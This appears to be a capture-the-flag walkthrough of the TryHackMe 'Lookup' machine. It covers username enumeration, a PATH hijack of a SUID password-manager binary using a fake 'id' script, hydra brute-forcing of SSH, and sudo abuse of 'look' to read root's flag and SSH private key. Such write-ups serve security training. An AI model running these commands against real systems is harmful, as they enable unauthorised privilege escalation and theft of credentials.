New techniques are introduced in this machine.

Starting with machine enumeration:

```
┌──(kali㉿kali)-[~/Desktop/THM/Lookup]
└─$ nmap lookup.thm > open_ports.txt
                                                                                                                                                 
┌──(kali㉿kali)-[~/Desktop/THM/Lookup]
└─$ cat open_ports.txt                                                                                                        
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-17 23:30 IST
Nmap scan report for lookup.thm (10.10.153.211)
Host is up (0.51s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

SSH and HTTP, as usual.


The webpage is a simple logging page. Also, subdirectories fuzzing doesn't give any output. But the logging page is interesting.

<img src=https://github.com/user-attachments/assets/12a07695-a218-488e-a182-4d688df8faed>
<img src=https://github.com/user-attachments/assets/db7ec46e-28a5-4ea7-9e31-977b39e64c78>

Two different outputs. If the username is correct, Wrong password; if the username is wrong, Wrong username or password. So, we can try different names to find the users present and then use 
Hydra to find the user's password. I used ChatGPT to provide me with a script for this. The two users found are admin and jose. Then Hydra can be used to find the password, but I manually 
tried some command passwords and managed to get the password.

Upon logging in, it will redirect to a URL: files.lookup.thm. We can see the web page's content by adding it to the /etc/hosts file. Elfinder is an open-source file manager for the web. Inspecting
the files, I found a user named 'think'. It can be a user on the machine. Then, I used Metasploit to gain a reverse shell, and then, from the meterpreter, I used bash reverse shell to gain another reverse
shell.

Finding the binaries with the SUID bit set, I found a strange binary: pwm `(/usr/sbin/pwm)`. Looking at pwm, it is a password manager. I looked for it in GTFOBins. But it was not there.
Also, checking the home directory, I see that there is a user 'think'.

```
www-data@lookup:/home/think$ ls -la
ls -la
total 40
drwxr-xr-x 5 think think 4096 Jan 11  2024 .
drwxr-xr-x 3 root  root  4096 Jun  2  2023 ..
lrwxrwxrwx 1 root  root     9 Jun 21  2023 .bash_history -> /dev/null
-rwxr-xr-x 1 think think  220 Jun  2  2023 .bash_logout
-rwxr-xr-x 1 think think 3771 Jun  2  2023 .bashrc
drwxr-xr-x 2 think think 4096 Jun 21  2023 .cache
drwx------ 3 think think 4096 Aug  9  2023 .gnupg
-rw-r----- 1 root  think  525 Jul 30  2023 .passwords
-rwxr-xr-x 1 think think  807 Jun  2  2023 .profile
drw-r----- 2 think think 4096 Jun 21  2023 .ssh
lrwxrwxrwx 1 root  root     9 Jun 21  2023 .viminfo -> /dev/null
-rw-r----- 1 root  think   33 Jul 30  2023 user.txt
```

When the PWM binary is run, the output is as follows:

```
www-data@lookup:/home/think$ /usr/sbin/./pwm
/usr/sbin/./pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: www-data
[-] File /home/www-data/.passwords not found
```

So, this binary runs the 'id' binary to get the info the user running the command (www-data in the above case) and then fetches the passwords file. The output is not found because there is no 
www-data folder in the home directory. I could make a temporary id binary which will output the user as user 'think' and give the content of the passwords file in the /home/think/ directory.

```
www-data@lookup:/home$ echo '#!/bin/bash' > /tmp/id
echo '#!/bin/bash' > /tmp/id
www-data@lookup:/home$ echo 'echo "uid=33(think) gid=33(think) groups=(think)"' >> /tmp/id
echo 'echo "uid=33(think) gid=33(think) groups=(think)"' >> /tmp/id
www-data@lookup:/home$ chmod +x /tmp/id
chmod +x /tmp/id
www-data@lookup:/home$ export PATH=/tmp:$PATH
export PATH=/tmp:$PATH
www-data@lookup:/home$ /usr/sbin/pwm
/usr/sbin/pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: think
<content of the file>
```

With this wordlist, I could use Hydra to find the user's password.

```
┌──(kali㉿kali)-[~/Desktop/THM/Lookup]
└─$ hydra -l think -P password_list ssh://lookup.thm
```


Logging in as the think user using SSH, the first thing to check is the sudoers file:

```
think@lookup:~$ sudo -l
[sudo] password for think: 
Matching Defaults entries for think on lookup:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User think may run the following commands on lookup:
    (ALL) /usr/bin/look
```

GTFOBins is the best companion. We could use the command mentioned to read the root flag, or if we have to gain a shell, we could read the id_rsa key, which is used in logging with SSH.
The command will be:

`sudo /usr/bin/look '' /root/root.txt`

For id_rsa:

`sudo /usr/bin/look/ '' /root/.ssh/id_rsa`
